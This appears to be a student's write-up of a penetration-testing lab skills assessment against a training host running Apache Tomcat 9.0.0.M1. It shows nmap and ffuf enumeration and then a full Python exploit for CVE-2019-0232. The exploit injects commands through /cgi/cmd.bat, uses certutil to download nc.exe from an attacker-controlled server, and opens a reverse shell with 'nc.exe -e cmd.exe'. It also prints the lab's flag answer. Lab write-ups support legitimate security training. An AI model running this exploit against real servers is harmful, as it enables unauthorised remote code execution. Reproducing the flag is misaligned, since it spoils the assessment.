# Attacking Common Applications - Skills Assessment I

During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

**Questions**

What vulnerable application is running?

```bash
sudo nmap -sS -n -Pn -p- --min-rate 5000 10.129.201.89 -sV -sC 
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Freight Logistics, Inc
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=APPS-SKILLS1
| Not valid before: 2024-03-10T15:17:04
|_Not valid after:  2024-09-09T15:17:04
|_ssl-date: 2024-03-11T15:20:15+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Jetty 9.4.42.v20210604
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.42.v20210604)
8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

tomcat
```

What port is this application running on?

```
8080
```

What version of the application is in use?

```bash
curl -s http://10.129.201.89:8080/docs/ | grep Tomcat
<title>Apache Tomcat 9 (9.0.0.M1)
```

Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://10.129.201.89:8080/cgi/FUZZ.bat
#cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 280ms]
http://10.129.201.89:8080/cgi/cmd.bat?&dir
http://10.129.201.89:8080/cgi/cmd.bat?&dir+C:\Users\Administrator\Desktop
#we know the flag is there, but cant use type command
```

we try this reverse shell script

```python
#https://github.com/jaiguptanick/CVE-2019-0232
#!/usr/bin/env python3
import time
import requests
host='10.129.201.89'#add host to connect
port='8080'#add port of host {default:8080}
server_ip='10.10.15.102'#server that has nc.exe file to get reverse shell
server_port='80'
nc_ip='10.10.15.102'
nc_port='4444'
url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"
try:
    requests.get("http://" + url1)
    time.sleep(2)
    requests.get("http://" + url2)
    print(url2)
except:
    print("Some error occured in the script")
```

and we got reverse shell, nice!

```bash
type C:\Users\Administrator\Desktop\flag.txt
f55763d31a8f63ec935abd07aee5d3d0
```
